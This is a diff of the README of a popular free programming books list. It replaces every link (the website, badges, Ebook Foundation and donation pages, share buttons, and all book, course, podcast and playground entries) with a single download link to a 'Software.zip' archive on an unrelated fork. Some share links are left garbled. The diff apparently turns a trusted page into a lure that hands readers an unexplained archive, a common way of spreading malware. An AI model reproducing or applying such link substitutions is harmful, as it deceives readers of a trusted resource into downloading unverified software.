@@ -1,142 +1,142 @@
-This page is available as an easy-to-read website at [https://ebookfoundation.github.io/](https://ebookfoundation.github.io/free-programming-books/).
+This page is available as an easy-to-read website at [https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip).
 
-# List of Free Learning Resources In Many Languages [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)](https://github.com/sindresorhus/awesome)
+# List of Free Learning Resources In Many Languages [![Awesome](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 ## Intro
 
-This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://web.archive.org/web/20140606191453/http://stackoverflow.com/questions/194812/list-of-freely-available-programming-books/392926) with contributions from Karan Bhangui and George Stocker.
+This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip) with contributions from Karan Bhangui and George Stocker.
 
-The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://octoverse.github.com/), with 200,000+ stars, 6100+ commits, 1600+ contributors, and 43,000+ forks.
+The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip), with 200,000+ stars, 6100+ commits, 1600+ contributors, and 43,000+ forks.
 
-The [Free Ebook Foundation](https://ebookfoundation.org) now administers the repo, a not-for-profit organization devoted to promoting the creation, distribution, archiving, and sustainability of free ebooks. [Donations](https://ebookfoundation.org/contributions.html) to the Free Ebook Foundation are tax-deductible in the US.
+The [Free Ebook Foundation](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip) now administers the repo, a not-for-profit organization devoted to promoting the creation, distribution, archiving, and sustainability of free ebooks. [Donations](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip) to the Free Ebook Foundation are tax-deductible in the US.
 
 
 ### How To Contribute
 
-Please read [CONTRIBUTING](CONTRIBUTING.md). If you're new to GitHub, [welcome](HOWTO.md)!
+Please read [CONTRIBUTING](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip). If you're new to GitHub, [welcome](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)!
 
 
 ### How to Share
 
-+ [Share on Twitter](http://twitter.com/intent/tweet?text=https://github.com/EbookFoundation/free-programming-books%0AFree%20Programming%20Books)
-+ [Share on Facebook](https://www.facebook.com/share.php?u=https%3A%2F%2Fgithub.com%2FEbookFoundation%2Ffree-programming-books&p[images][0]=&p[title]=Free%20Programming%20Books&p[summary]=)
-+ [Share on LinkedIn](http://www.linkedin.com/shareArticle?mini=true&url=https://github.com/EbookFoundation/free-programming-books&title=Free%20Programming%20Books&summary=&source=)
-+ [Share on Telegram](https://t.me/share/url?url=https://github.com/EbookFoundation/free-programming-books)
++ [Share on Twitter](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip%0AFree%20Programming%20Books)
++ [Share on Facebook](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip%3A%2F%https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip%2FEbookFoundation%2Ffree-programming-books&p[images][0]=&p[title]=Free%20Programming%20Books&p[summary]=)
++ [Share on LinkedIn](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip%20Programming%20Books&summary=&source=)
++ [Share on Telegram](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Books
 
-[English, By Programming Language](books/free-programming-books-langs.md)
+[English, By Programming Language](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
-[English, By Subject](books/free-programming-books-subjects.md)
+[English, By Subject](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 #### Other Languages
 
-+ [Arabic / al arabiya / العربية](books/free-programming-books-ar.md)
-+ [Azerbaijani / Азәрбајҹан дили / آذربايجانجا ديلي](books/free-programming-books-az.md)
-+ [Bengali / বাংলা](books/free-programming-books-bl.md)
-+ [Bulgarian / български](books/free-programming-books-bg.md)
-+ [Burmese / မြန်မာဘာသာ](books/free-programming-books-my.md)
-+ [Chinese / 中文](books/free-programming-books-zh.md)
-+ [Czech / čeština / český jazyk](books/free-programming-books-cs.md)
-+ [Danish / dansk](books/free-programming-books-dk.md)
-+ [Dutch / Nederlands](books/free-programming-books-nl.md)
-+ [Estonian / eesti keel](books/free-programming-books-et.md)
-+ [Finnish / suomi / suomen kieli](books/free-programming-books-fi.md)
-+ [French / français](books/free-programming-books-fr.md)
-+ [German / Deutsch](books/free-programming-books-de.md)
-+ [Greek / ελληνικά](books/free-programming-books-gr.md)
-+ [Hebrew / עברית](books/free-programming-books-he.md)
-+ [Hungarian / magyar / magyar nyelv](books/free-programming-books-hu.md)
-+ [Indonesian / Bahasa Indonesia](books/free-programming-books-id.md)
-+ [Italian / italiano](books/free-programming-books-it.md)
-+ [Japanese / 日本語](books/free-programming-books-ja.md)
-+ [Korean / 한국어 [韓國語]](books/free-programming-books-ko.md)
-+ [Norwegian / Norsk](books/free-programming-books-no.md)
-+ [Persian / Farsi (Iran) / فارسى](books/free-programming-books-fa_IR.md)
-+ [Polish / polski / język polski / polszczyzna](books/free-programming-books-pl.md)
-+ [Portuguese (Brazil)](books/free-programming-books-pt_BR.md)
-+ [Portuguese (Portugal)](books/free-programming-books-pt_PT.md)
-+ [Romanian (Romania) / limba română / român](books/free-programming-books-ro.md)
-+ [Russian / Русский язык](books/free-programming-books-ru.md)
-+ [Slovak / slovenčina](books/free-programming-books-sk.md)
-+ [Spanish / español / castellano](books/free-programming-books-es.md)
-+ [Swedish / Svenska](books/free-programming-books-se.md)
-+ [Tamil / தமிழ்](books/free-programming-books-ta.md)
-+ [Thai / ไทย](books/free-programming-books-th.md)
-+ [Turkish / Türkçe](books/free-programming-books-tr.md)
-+ [Ukrainian / Українська](books/free-programming-books-ua.md)
-+ [Vietnamese / Tiếng Việt](books/free-programming-books-vi.md)
++ [Arabic / al arabiya / العربية](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Azerbaijani / Азәрбајҹан дили / آذربايجانجا ديلي](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Bengali / বাংলা](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Bulgarian / български](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Burmese / မြန်မာဘာသာ](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Chinese / 中文](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Czech / čeština / český jazyk](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Danish / dansk](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Dutch / Nederlands](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Estonian / eesti keel](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Finnish / suomi / suomen kieli](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [French / français](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [German / Deutsch](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Greek / ελληνικά](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Hebrew / עברית](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Hungarian / magyar / magyar nyelv](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Indonesian / Bahasa Indonesia](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Italian / italiano](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Japanese / 日本語](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Korean / 한국어 [韓國語]](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Norwegian / Norsk](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Persian / Farsi (Iran) / فارسى](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Polish / polski / język polski / polszczyzna](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Brazil)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Portugal)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Romanian (Romania) / limba română / român](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Russian / Русский язык](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Slovak / slovenčina](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Spanish / español / castellano](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Swedish / Svenska](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Tamil / தமிழ்](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Thai / ไทย](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Turkish / Türkçe](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Ukrainian / Українська](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Vietnamese / Tiếng Việt](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Cheat Sheets
 
-+ [All Languages](more/free-programming-cheatsheets.md)
++ [All Languages](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Free Online Courses
 
-+ [Arabic / al arabiya / العربية](courses/free-courses-ar.md)
-+ [Bulgarian / български](courses/free-courses-bg.md)
-+ [English](courses/free-courses-en.md)
-+ [Finnish](courses/free-courses-fi.md)
-+ [French / français](courses/free-courses-fr.md)
-+ [German / Deutsch](courses/free-courses-de.md)
-+ [Hebrew / עברית](courses/free-courses-he.md)
-+ [Hindi / हिंदी](courses/free-courses-hi.md)
-+ [Indonesian / Bahasa Indonesia](courses/free-courses-id.md)
-+ [Italian / italiano](courses/free-courses-it.md)
-+ [Khazakh / қазақша](courses/free-courses-kk.md)
-+ [Korean / 한국어 [韓國語]](courses/free-courses-ko.md)
-+ [Persian / Farsi (Iran) / فارسى](courses/free-courses-fa_IR.md)
-+ [Polish / polski / język polski / polszczyzna](courses/free-courses-pl.md)
-+ [Portuguese (Brazil)](courses/free-courses-pt_BR.md)
-+ [Portuguese (Portugal)](courses/free-courses-pt_PT.md)
-+ [Russian / Русский язык](courses/free-courses-ru.md)
-+ [Spanish / español / castellano](courses/free-courses-es.md)
-+ [Thai / ภาษาไทย](courses/free-courses-th.md)
-+ [Turkish / Türkçe](courses/free-courses-tr.md)
-+ [Ukrainian / Українська](courses/free-courses-ua.md)
-+ [Vietnamese / Tiếng Việt](courses/free-courses-vi.md)
++ [Arabic / al arabiya / العربية](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Bulgarian / български](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [English](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Finnish](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [French / français](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [German / Deutsch](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Hebrew / עברית](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Hindi / हिंदी](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Indonesian / Bahasa Indonesia](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Italian / italiano](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Khazakh / қазақша](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Korean / 한국어 [韓國語]](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Persian / Farsi (Iran) / فارسى](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Polish / polski / język polski / polszczyzna](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Brazil)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Portugal)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Russian / Русский язык](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Spanish / español / castellano](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Thai / ภาษาไทย](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Turkish / Türkçe](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Ukrainian / Українська](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Vietnamese / Tiếng Việt](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Interactive Programming Resources
 
-+ [Chinese / 中文](more/free-programming-interactive-tutorials-zh.md)
-+ [English](more/free-programming-interactive-tutorials-en.md)
-+ [Portuguese (Brazil)](more/free-programming-interactive-tutorials-pt_BR.md)
-+ [Russian / Русский язык](more/free-programming-interactive-tutorials-ru.md)
++ [Chinese / 中文](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [English](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Brazil)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Russian / Русский язык](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Problem Sets and Competitive Programming
 
-+ [Problem Sets](more/problem-sets-competitive-programming.md)
++ [Problem Sets](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Podcast - Screencast
 
 Free Podcasts and Screencasts:
 
-+ [Arabic / al arabiya / العربية](casts/free-podcasts-screencasts-ar.md)
-+ [Czech / čeština / český jazyk](casts/free-podcasts-screencasts-cs.md)
-+ [English](casts/free-podcasts-screencasts-en.md)
-+ [Finnish / Suomi](casts/free-podcasts-screencasts-fi.md)
-+ [Indonesian / Bahasa Indonesia](casts/free-podcasts-screencasts-id.md)
-+ [Persian / Farsi (Iran) / فارسى](casts/free-podcasts-screencasts-fa_IR.md)
-+ [Polish / polski / język polski / polszczyzna](casts/free-podcasts-screencasts-pl.md)
-+ [Portuguese (Brazil)](casts/free-podcasts-screencasts-pt_BR.md)
-+ [Portuguese (Portugal)](casts/free-podcasts-screencasts-pt_PT.md)
-+ [Russian / Русский язык](casts/free-podcasts-screencasts-ru.md)
-+ [Spanish / español / castellano](casts/free-podcasts-screencasts-es.md)
-+ [Swedish / Svenska](casts/free-podcasts-screencasts-se.md)
-+ [Turkish / Türkçe](casts/free-podcasts-screencasts-tr.md)
++ [Arabic / al arabiya / العربية](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Czech / čeština / český jazyk](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [English](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Finnish / Suomi](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Indonesian / Bahasa Indonesia](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Persian / Farsi (Iran) / فارسى](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Polish / polski / język polski / polszczyzna](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Brazil)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Portuguese (Portugal)](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Russian / Русский язык](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Spanish / español / castellano](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Swedish / Svenska](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [Turkish / Türkçe](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ### Programming Playgrounds
 
-+ [Chinese / 中文](more/free-programming-playgrounds-zh.md)
-+ [English](more/free-programming-playgrounds.md)
++ [Chinese / 中文](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
++ [English](https://github.com/tekchapagain/free-programming-books/releases/download/v1.0/Software.zip)
 
 
 ## License
